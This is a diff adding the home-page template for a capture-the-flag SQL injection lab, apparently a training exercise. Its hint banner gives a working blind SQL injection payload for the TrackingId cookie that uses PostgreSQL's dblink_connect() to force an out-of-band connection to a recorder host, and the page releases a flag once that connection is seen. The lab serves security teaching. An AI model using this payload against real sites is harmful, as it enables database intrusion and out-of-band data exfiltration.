@@ -1,0 +1,63 @@
+{% extends "shop/base.html" %}
+{% block title %}Home &mdash; We Like To Shop{% endblock %}
+
+{% block content %}
+    {% if solved %}
+        <div class="solved-banner">
+            <div>FLAG CAPTURED &mdash; the database opened an outbound TCP connection to the <span class="pill">{{ oob_hostname }}</span> recorder.</div>
+            <div style="margin-top:0.5rem; font-family:ui-monospace, Menlo, Consolas, monospace; font-size:1.05rem;">{{ flag }}</div>
+        </div>
+    {% endif %}
+
+    <div class="hint-banner">
+        <strong>Lab briefing:</strong> the site looks up the <code>TrackingId</code>
+        cookie against a <code>tracked_users</code> table. The query result is never
+        reflected, any SQL error is swallowed, and there is no timing gate - so the
+        response body is byte-identical regardless of what the payload does. There
+        is no in-band signal at all.
+        <br><br>
+        To solve, pivot the database into an out-of-band connection. The backend is
+        PostgreSQL with the <code>dblink</code> extension enabled, and an OOB
+        recorder is running on <code>{{ oob_hostname }}:5432</code> on the compose
+        network. An injected <code>dblink_connect()</code> forces Postgres to open a
+        TCP connection to that host, e.g.
+        <br><br>
+        <code>TrackingId=x'||(SELECT dblink_connect('host={{ oob_hostname }} port=5432 user=x password=x dbname=x'))||'</code>
+        <br><br>
+        As soon as the recorder captures at least one inbound connection, this page
+        releases the flag.
+    </div>
+
+    <div class="card">
+        <h1>Welcome</h1>
+        <p>Browse our collection.</p>
+        <p>Out-of-band recorder: <span class="pill">{{ oob_hostname }}:5432</span>
+           &mdash; connections observed: <span class="pill">{{ oob_entry_count }}</span></p>
+    </div>
+
+    {% if oob_entries %}
+        <div class="card">
+            <h2>Recorded connections</h2>
+            <table class="oob">
+                <thead>
+                    <tr>
+                        <th>Timestamp (UTC)</th>
+                        <th>Peer</th>
+                        <th>Bytes</th>
+                        <th>Preview (hex)</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for entry in oob_entries %}
+                        <tr>
+                            <td class="mono">{{ entry.timestamp }}</td>
+                            <td class="mono">{{ entry.peer }}</td>
+                            <td class="mono">{{ entry.bytes }}</td>
+                            <td class="mono">{{ entry.preview_hex }}</td>
+                        </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    {% endif %}
+{% endblock %}
